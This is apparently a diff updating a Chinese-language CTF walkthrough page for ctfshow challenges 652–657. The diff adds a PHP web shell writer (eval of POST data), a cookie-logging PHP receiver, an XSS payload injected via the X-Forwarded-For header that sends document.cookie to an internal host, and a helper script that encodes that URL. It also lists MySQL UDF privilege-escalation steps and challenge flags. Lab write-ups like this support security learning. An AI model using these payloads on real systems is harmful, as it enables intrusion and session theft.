@@ -412,14 +412,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-01-22
+                    2022-02-07
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    579
+                    609
                 </div>
                 
 
@@ -474,10 +474,8 @@
 <h2 id="652"><a href="#652" class="headerlink" title="652"></a>652</h2><p>查看 util/common.php </p>
 <p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216195339944.png" alt="image-20211216195339944"></p>
 <p>发现文件包含漏洞 一开始发现有新增用户功能可以写入数据库  写入恶意马进去</p>
-<!--?php                                                        ?--><p>“);?&gt;</p>
-<p>查看dbutil.php</p>
-<p>发现文件包含漏洞 一开始发现有新增用户功能可以写入数据库  写入恶意马进去</p>
-<!--?php                                                        ?--><p>“);?&gt;</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php file_put_contents("shell.php","&lt;?php @eval(\$_POST[1]); ?&gt;"); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>查看dbutil.php</p>
 <p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216210036652.png" alt="image-20211216210036652"></p>
 <p>想办法得到key</p>
@@ -494,7 +492,8 @@
 <p>flag_652=ctfshow{4b37ab4b6504d43ea0de9a688f0e3ffa}</p>
 <h2 id="653"><a href="#653" class="headerlink" title="653"></a>653</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211218122840454.png" alt="image-20211218122840454"></p>
 <p>flag_653=ctfshow{5526710eb3ed7b4742232d6d6f9ee3a9}</p>
-<h2 id="654"><a href="#654" class="headerlink" title="654"></a>654</h2><p>ls 发现有个root目录  就想到要提权 </p>
+<h2 id="654"><a href="#654" class="headerlink" title="654"></a>654</h2><p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a> 国光提权</p>
+<p>ls 发现有个root目录  就想到要提权 </p>
 <p>udf 提权步骤  （前提是确认要 secure_file_priv 没有限制）</p>
 <p>1.寻找插件目录</p>
 <p>2.写入动态链接库</p>
@@ -516,12 +515,20 @@
 <p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220112211537045.png" alt="image-20220112211537045"></p>
 <p>发现可以xff注入恶意脚本获取管理员cookie</p>
 <p>在内网上搭建1.php</p>
-<!--?php \$content=\$_GET['1']; file_put_contents("log.txt",\$content);?-->
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php \$content=\$_GET['s']; file_put_contents("log.txt",\$content);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>在终端中输入  curl -H ‘X-Forwarded-For:</p>
-<p>window.location.href=String.fromCharCode(104,116,116,112,58,47,47,49,55,50,46,50,46,50,48,50,46,52,47,49,46,112,104,112,63,49,61)+document.cookie;<a target="_blank" rel="noopener" href="http://172.2.202.5/index.php?action=login&amp;u=55&amp;p=66">http://172.2.202.5/index.php?action=login&amp;u=55&amp;p=66</a></p>
-<p>注:  单引号！！！ </p>
-<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220112213815185.png" alt="image-20220112213815185"></p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href=String.fromCharCode(104,116,116,112,58,47,47,49,55,50,46,50,46,50,51,56,46,52,47,49,46,112,104,112,63,115,61)+document.cookie;&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>String.fromCharCode中的内容用如下代码生成</p>
+<pre class="line-numbers language-none"><code class="language-none">s="http://172.2.238.5/1.php?s=" #当然每个人的内网地址可能不一样
+a=''
+for i in s:
+    a=a+str(ord(i))+','
+print(a)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220207195002335.png" alt="image-20220207195002335"></p>
 <p>flag_656=ctfshow{e0b80d6b99d2bdbae36f121f78abe96b}</p>
 <h2 id="657"><a href="#657" class="headerlink" title="657"></a>657</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220113140742418.png" alt="image-20220113140742418"></p>
 <p>flag_657=ctfshow{2a73f8f87a58a13c23818fafd83510b1}</p>
